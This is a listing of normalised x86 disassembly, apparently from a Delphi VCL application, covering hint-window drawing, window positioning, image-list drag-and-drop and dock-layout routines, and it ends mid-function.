cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
push ebp
push sub_459ad0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450768
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459ad7
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459998
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459998
sub_459adc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45a340
mov edx 0x80ffff
mov eax esi
call sub_450a08
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x250 ]
call sub_425630
mov eax [ esi + 0x250 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_4250d4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_459b48
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_454808
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40e384
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4547a0
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_459bb4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459c0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459c11
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ReleaseDC
retn
sub_459c18
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_459cb1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x250 ]
mov eax [ eax + 0xc ]
call sub_4246fc
mov eax ebx
call sub_4531dc
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_450894
mov eax [ ebp - 0x14 ]
call sub_4059dc
push eax
mov eax [ ebx + 0x250 ]
call sub_425714
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459cb8
lea eax [ ebp - 0x14 ]
call sub_405530
retn
sub_459cc0
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x109
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_459d30
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_459dbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4598d4
cmp [ ebx + 0x258 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459dc2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_450894
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x250 ]
call sub_425570
mov edx eax
add edx 0x6
mov eax ebx
call sub_44ff8c
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_450894
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x250 ]
call sub_42558c
mov edx eax
add edx 0x4
mov eax ebx
call sub_44ffc0
sub_459dc8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x1
xor edx edx
push ebp
push sub_459fac
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4508c4
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_451bf4
mov eax [ esi ]
call sub_443da8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_443db4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_443da8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_443d9c
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_443db4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_443d90
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_443d9c
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x25c ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_443d90
mov [ ebp - 0xc ] eax
xor eax eax
mov eax ebx
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_455208
push 0x4
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459fb3
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x0
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x64
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test al al
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_45d588
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call [ rw-data ]
sub_459fbc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_459fe4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_418448
mov eax esi
call sub_4531dc
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ esi + 0x250 ]
call sub_425714
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_45a040
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_418448
call sub_432228
call sub_432330
test al al
jne r-xdata
call sub_432228
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_432570
push esp
push 0x1
push 0xf
push 0x0
call sub_432228
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_4323a0
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_45a0ac
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_456278
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
pop esi
pop ebx
retn
sub_45a0d4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45a114
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_448770
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_45a180
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_448634
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_45a1f4
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_45a114
mov eax [ rw-data ]
mov eax [ eax ]
movzx eax [ eax + 0x44 ]
mov [ esi + 0x7c ] ax
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ esi + 0x68 ]
call sub_4442a8
sub_45a1f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_448634
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_45a258
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45a0d4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_45a258
push ebx
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_45a27c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_45a0d4
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_45a2f0
push ebx
push esi
mov esi eax
mov eax esi
call sub_448634
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_45a258
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_45a15c
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ esi + 0x7c ]
call sub_4442a8
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_45a340
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_453534
mov dl 0x1
mov eax [ r-xdata ]
call sub_425108
mov esi eax
mov [ ebx + 0x250 ] esi
mov eax esi
mov edx ebx
call sub_44f140
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_45a39c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x250 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_453678
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_45a3ec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_4253d0
xor eax eax
push ebp
push sub_45a48a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx ebx
call sub_42579c
xor eax eax
push ebp
push sub_45a467
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_44f158
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a46e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor edx edx
call sub_42579c
retn
sub_45a49c
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_45a538
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_45a4b8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45a514
push ebx
push esi
xor esi esi
call sub_45ab5c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_45ab34
mov ebx eax
inc esi
test ebx ebx
jne r-xdata
sub_45a538
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_45ab5c
mov esi eax
test esi esi
je r-xdata
movzx ebx [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_45a538
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_45a570
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_45a600
retn
movzx ecx [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
mov edx 0x2
call sub_45a600
jmp r-xdata
retn
sub_45a5b8
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_45a684
retn
movzx ecx [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
mov edx 0x2
call sub_45a684
jmp r-xdata
retn
sub_45a600
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp ebx [ eax + 0x64 ]
jne r-xdata
mov eax edi
mov ebp [ ebx + 0x14 ]
cmp al [ ebp + 0x10 ]
jne r-xdata
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax edi
dec al
je r-xdata
mov ebx ebp
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esp ] eax
jmp r-xdata
dec al
jne r-xdata
mov eax [ ebx + 0x18 ]
call sub_45aa58
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
sub_45a684
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov ebp [ esp + 0x8 ]
sub ebp [ esp ]
jmp r-xdata
mov ebp [ esp + 0xc ]
sub ebp [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebp
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_45a514
dec eax
jne r-xdata
mov eax edi
mov edx [ esi + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi [ esi + 0x14 ]
mov eax esi
call sub_45aa58
mov ebp eax
mov eax esi
call sub_45a570
sub ebp eax
jmp r-xdata
mov eax edx
call sub_45aa58
mov ebp eax
mov ebp [ eax + 0x68 ]
jmp r-xdata
sub_45a73c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_45a514
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_45ab5c
mov ebx eax
movzx eax [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_45a684
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_45a514
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_45a684
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_45a570
mov edx eax
add edx esi
mov eax ebx
call sub_45aa80
mov edx edi
mov eax ebx
call sub_45aa80
jmp r-xdata
mov eax ebx
call sub_45a8dc
mov eax ebx
call sub_45ab34
mov ebx eax
test ebx ebx
jne r-xdata
sub_45a7e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_405530
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_405584
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
sub_45a828
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb7
call sub_40484c
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_45a899
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_451694
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_45a8ac
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_45ab34
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_45a8dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
movzx edx [ edx + 0x10 ]
mov [ eax + 0x90 ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_45a684
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45a684
mov esi eax
push ebp
call sub_45a8ac
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ab34
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45a600
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_45a600
mov ecx ebx
pop edx
call sub_418470
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4501d4
mov eax [ ebp - 0x4 ]
call sub_45aa58
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_45aa58
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_45aa58
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_45aa58
push ebx
mov ebx eax
mov eax ebx
call sub_45a538
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_45a4b8
test al al
je r-xdata
mov eax ebx
call sub_45a570
pop ebx
retn
sub_45aa94
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_45aa80
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45a500
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_45aa84
mov esi eax
mov edx edi
mov eax esi
call sub_45aa94
sub_45aad4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45aa58
mov edi eax
mov eax ebx
call sub_45a570
cmp edi eax
jl r-xdata
mov eax esi
call sub_45a73c
mov edi [ esi + 0x1c ]
push edi
push sub_45c910
mov edx esi
mov eax edi
call sub_45ae14
mov eax ebx
call sub_45aa58
mov edi eax
mov eax esi
call sub_45a5b8
cmp edi eax
jle r-xdata
mov eax ebx
call sub_45aad4
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_45ab40
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_45a538
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_45ab68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_404620
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x80000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
